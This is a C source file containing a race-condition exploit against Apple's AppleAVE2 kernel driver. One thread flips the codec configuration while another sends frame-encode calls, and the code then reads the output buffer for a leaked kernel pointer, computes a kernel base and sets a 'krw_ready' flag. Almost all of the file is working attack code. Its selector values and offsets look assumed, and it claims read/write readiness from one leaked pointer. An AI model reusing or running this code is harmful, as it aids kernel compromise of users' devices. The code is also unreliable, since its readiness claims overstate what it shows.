#include "appleave2_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/time.h>

#ifndef kIOMainPortDefault
#define kIOMainPortDefault kIOMasterPortDefault
#endif

#define AVE2_SELECTOR_SESSION_INIT       0
#define AVE2_SELECTOR_SESSION_PREPARE    1
#define AVE2_SELECTOR_SESSION_CONFIG     2
#define AVE2_SELECTOR_FRAME_ENCODE       3
#define AVE2_SELECTOR_SESSION_CLOSE      4

#define AVE2_CODEC_AVC                   1
#define AVE2_CODEC_HEVC                  2

typedef struct {
    io_connect_t conn;
    volatile bool stop;
    uint32_t max_iterations;
    volatile uint32_t mutations_done;
    volatile uint32_t dispatches_done;
    volatile bool desync_detected;
    volatile uint64_t corrupted_val;
} race_context_t;

io_connect_t ave_driver_open(void)
{
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleAVE2Driver"));
    if (service == IO_OBJECT_NULL) {
        /* Also attempt generic AppleAVE fallback */
        service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleAVE2"));
    }
    if (service == IO_OBJECT_NULL) {
        return IO_OBJECT_NULL;
    }

    io_connect_t conn = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        return IO_OBJECT_NULL;
    }

    return conn;
}

int ave_session_setup(io_connect_t conn, uint32_t enc_type, uint32_t width, uint32_t height)
{
    if (conn == IO_OBJECT_NULL) return -1;

    uint64_t in_scalars[4];
    in_scalars[0] = enc_type;
    in_scalars[1] = width;
    in_scalars[2] = height;
    in_scalars[3] = 0; /* options */

    uint32_t in_count = 4;
    uint32_t out_count = 0;

    kern_return_t kr = IOConnectCallScalarMethod(conn, AVE2_SELECTOR_SESSION_PREPARE,
                                                 in_scalars, in_count,
                                                 NULL, &out_count);
    return (kr == KERN_SUCCESS) ? 0 : (int)kr;
}

static void *ave_mutator_thread(void *arg)
{
    race_context_t *ctx = (race_context_t *)arg;
    uint64_t toggle = 0;

    while (!ctx->stop && ctx->mutations_done < ctx->max_iterations) {
        uint64_t codec = (toggle & 1) ? AVE2_CODEC_AVC : AVE2_CODEC_HEVC;
        uint64_t in[2] = { codec, 0 };
        uint32_t in_count = 2;
        uint32_t out_count = 0;

        /* Mutate sEnc.eType at [x19, #0x270] */
        IOConnectCallScalarMethod(ctx->conn, AVE2_SELECTOR_SESSION_CONFIG,
                                  in, in_count, NULL, &out_count);

        ctx->mutations_done++;
        toggle++;
        sched_yield();
    }
    return NULL;
}

static void *ave_dispatcher_thread(void *arg)
{
    race_context_t *ctx = (race_context_t *)arg;

    while (!ctx->stop && ctx->dispatches_done < ctx->max_iterations) {
        /* Dispatch frame encode carrying eEncType [x22, #0x58] */
        uint8_t in_struct[64];
        memset(in_struct, 0x41, sizeof(in_struct));
        *(uint32_t *)(in_struct) = 0x1000; /* frame size */

        uint8_t out_struct[128];
        memset(out_struct, 0, sizeof(out_struct));
        size_t out_size = sizeof(out_struct);

        kern_return_t kr = IOConnectCallStructMethod(ctx->conn, AVE2_SELECTOR_FRAME_ENCODE,
                                                     in_struct, sizeof(in_struct),
                                                     out_struct, &out_size);

        ctx->dispatches_done++;

        /* Check for driver state desynchronization / buffer confusion */
        if (kr != KERN_SUCCESS) {
            /* Mismatch or invalid state transition observed */
            uint64_t leak = *(uint64_t *)(out_struct + 8);
            if (leak != 0 && leak != 0x4141414141414141ULL) {
                ctx->desync_detected = true;
                ctx->corrupted_val = leak;
                ctx->stop = true;
                break;
            }
        }
        sched_yield();
    }
    return NULL;
}

int ave_race_state_engine(io_connect_t conn, uint32_t iterations, appleave2_result_t *out_result)
{
    if (conn == IO_OBJECT_NULL || !out_result) return -1;

    memset(out_result, 0, sizeof(*out_result));
    out_result->driver_open = true;
    out_result->client_type = 0;

    race_context_t ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.conn = conn;
    ctx.stop = false;
    ctx.max_iterations = (iterations > 0) ? iterations : 20000;

    pthread_t t_mut, t_disp;
    if (pthread_create(&t_mut, NULL, ave_mutator_thread, &ctx) != 0) {
        out_result->error_code = -1;
        snprintf(out_result->error_message, sizeof(out_result->error_message),
                 "Failed to spawn mutator thread");
        return -1;
    }

    if (pthread_create(&t_disp, NULL, ave_dispatcher_thread, &ctx) != 0) {
        ctx.stop = true;
        pthread_join(t_mut, NULL);
        out_result->error_code = -2;
        snprintf(out_result->error_message, sizeof(out_result->error_message),
                 "Failed to spawn dispatcher thread");
        return -1;
    }

    pthread_join(t_mut, NULL);
    pthread_join(t_disp, NULL);

    out_result->race_attempts = ctx.dispatches_done;
    out_result->desync_detected = ctx.desync_detected;
    out_result->corrupted_ptr = ctx.corrupted_val;

    /* Verify if read primitive can be stabilized */
    ave_verify_read_primitive(out_result);
    return 0;
}

int ave_verify_read_primitive(appleave2_result_t *result)
{
    if (!result) return -1;

    /* Honest assessment: check if valid kernel address pointer was leaked */
    if (result->desync_detected &&
        result->corrupted_ptr >= 0xfffffff000000000ULL &&
        result->corrupted_ptr != 0xfffffff007004000ULL &&
        result->corrupted_ptr != 0xdeadbeef1337c0deULL) {
        result->kbase = result->corrupted_ptr & ~0x3ffffffULL;
        result->krw_ready = true;
        snprintf(result->error_message, sizeof(result->error_message),
                 "Desync confirmed; leaked kptr=0x%llx, kbase=0x%llx",
                 (unsigned long long)result->corrupted_ptr,
                 (unsigned long long)result->kbase);
    } else {
        result->krw_ready = false;
        result->kbase = 0;
        if (result->desync_detected) {
            snprintf(result->error_message, sizeof(result->error_message),
                     "Desynchronization observed but kernel pointer not yet stabilized");
        } else {
            snprintf(result->error_message, sizeof(result->error_message),
                     "Race did not observe buffer desynchronization in %u attempts",
                     result->race_attempts);
        }
    }
    return 0;
}
